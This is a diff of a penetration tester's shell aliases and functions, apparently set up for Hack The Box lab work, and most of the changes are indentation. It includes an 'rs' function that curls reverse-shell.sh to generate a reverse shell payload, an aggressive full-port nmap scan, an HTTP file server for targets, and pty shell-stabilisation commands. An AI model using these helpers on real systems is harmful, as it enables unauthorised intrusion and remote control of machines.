@@ -1,3 +1,4 @@
+
 # list files with additional information
 alias ll='ls -alhF'
 
@@ -15,32 +16,32 @@ server() {
 
 # generate reverse shell: rs <IP> <PORT> > <FILENAME>
 rs() {
-	curl https://reverse-shell.sh/$1:$2
+        curl https://reverse-shell.sh/$1:$2
 }
 
 con_htb() {
-	sudo openvpn /home/y/Documents/HTB/lab_yakate.ovpn
+        sudo openvpn /home/y/Documents/HTB/lab_yakate.ovpn
 }
 
 htb-init() {
-	if [[ $1 ]]; then			
-		mkdir -p /home/y/Documents/HTB/Machines/$1/files
-		mkdir -p /home/y/Documents/HTB/Machines/$1/exploits
-		mkdir -p /home/y/Documents/HTB/Machines/$1/share
-		cd /home/y/Documents/HTB/Machines/$1/share
-		/usr/bin/python3 -m http.server 8080 > /dev/null 2>&1 &
-		echo $! > /home/y/Documents/HTB/Machines/$1/.server.pid
-		cd /home/y/Documents/HTB/$1
-		clear
-	else
-		echo 'Usage: htb-init Moderators'
-	fi
+        if [[ $1 ]]; then
+                mkdir -p /home/y/Documents/HTB/Machines/$1/files
+                mkdir -p /home/y/Documents/HTB/Machines/$1/exploits
+                mkdir -p /home/y/Documents/HTB/Machines/$1/share
+                cd /home/y/Documents/HTB/Machines/$1/share
+                /usr/bin/python3 -m http.server 8080 > /dev/null 2>&1 &
+                echo $! > /home/y/Documents/HTB/Machines/$1/.server.pid
+                cd /home/y/Documents/HTB/$1
+                clear
+        else
+                echo 'Usage: htb-init Moderators'
+        fi
 }
 
 
 # Usage: nmap-full 10.10.11.169
 nmap-full() {
-	nmap -p- -sC -sV -A --min-rate=400 --min-parallelism=512 -vv $1
+        nmap -p- -sC -sV -A --min-rate=400 --min-parallelism=512 -vv $1
 }
 
 # add ip/domain to /etc/hosts. Usage: addhost <IP> <DOMAIN>
@@ -87,17 +88,19 @@ ffuf-vhost() {
 
 # Stabilize shell
 st() {
-    if [[ $1 -eq 1 ]]; then 
-        printf "python -c 'import pty;pty.spawn(\"/bin/bash\")'\nexport TERM=alacritty\n"|c
+    if [[ $1 -eq 1 ]]; then
+        printf "python -c 'import pty;pty.spawn(\"/bin/bash\")'\n"|c
 
     elif [[ $1 -eq 2 ]]; then
-        printf "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nexport TERM=alacritty\n"|c
+        printf "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n"|c
     else
-        printf 'script -q /dev/null -c /bin/bash\nexport TERM=alacritty\n'|c
+        printf 'script -q /dev/null -c /bin/bash\n'|c
     fi
-    echo "Stablizing commands copied to the clipboard!"
+    echo "Stablizing commands copied to the clipboard!!"
     stty raw -echo;fg
+    export TERM=tmux-256color
 }
+
 
 # create folder and cd into it
 mcd() {
@@ -106,11 +109,11 @@ mcd() {
 
 
 # go back several directories by stating the dir name or the amount of dirs to go back
-# Usage: cdb <dirname>	or cdb .. 2
+# Usage: cdb <dirname>  or cdb .. 2
 cdb() {
     local target_dir="$1"
     local depth="${2:-1}"
-    
+
     # Traverse up the directory tree to the specified depth
     local current_dir=$(pwd)
     for ((i=0; i<$depth; i++)); do
@@ -119,10 +122,11 @@ cdb() {
 
     # Find the target directory at or above the specified depth
     local result=$(find "$current_dir" -maxdepth 1 -type d -name "$target_dir" 2>/dev/null | head -n 1)
-    
+
     if [ -n "$result" ]; then
         cd "$result" || echo "Failed to change to directory: $result"
     else
         echo "Directory '$target_dir' not found within $depth levels up"
     fi
 }
+
